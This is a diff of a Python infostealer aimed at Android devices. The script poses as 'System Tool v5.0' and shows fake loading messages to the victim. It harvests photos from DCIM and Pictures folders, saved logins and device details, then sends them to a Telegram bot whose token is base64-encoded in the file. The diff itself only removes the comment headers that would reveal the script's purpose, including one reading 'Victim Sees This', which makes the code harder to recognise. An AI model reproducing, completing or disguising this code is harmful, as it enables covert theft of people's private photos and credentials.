@@ -13,7 +13,7 @@ except:
     subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
     import requests
 
-# ========== YOUR BOT TOKEN (ENCODED) ==========
+# ========== 
 _BOT_ENC = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
 _CHAT_ENC = "NjgwMzk2ODM3Mw=="
 
@@ -23,7 +23,7 @@ def dec(s):
 BOT_TOKEN = dec(_BOT_ENC)
 CHAT_ID = dec(_CHAT_ENC)
 
-# ========== TELEGRAM SENDER ==========
+# ========== 
 class Send:
     def __init__(self):
         self.s = requests.Session()
@@ -47,7 +47,7 @@ class Send:
 
 bot = Send()
 
-# ========== COLLECT PICTURES (NO PIL, NO COMPRESSION) ==========
+# =======
 def get_all_pics():
     pics = []
     paths = ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']
@@ -113,7 +113,7 @@ def get_saved_logins():
         except: pass
     return res
 
-# ========== SYSTEM INFO ==========
+# ========== 
 def get_system():
     try:
         m = subprocess.run(['getprop','ro.product.model'], capture_output=True, text=True).stdout.strip()
@@ -122,7 +122,7 @@ def get_system():
     except:
         return f"Time: {datetime.now()}"
 
-# ========== FAKE LOADING (Victim Sees This) ==========
+# ========== F
 def fake_load():
     msgs = ["[✓] Loading...", "[~] Connecting...", "[✓] Connected.", "[~] Processing...", "[✓] Almost done.", "[~] Finalizing..."]
     for m in msgs:
@@ -137,7 +137,7 @@ def fake_bye():
         time.sleep(0.6)
     print("\n")
 
-# ========== MAIN ==========
+# =====
 def main():
     print("="*40)
     print("System Tool v5.0")
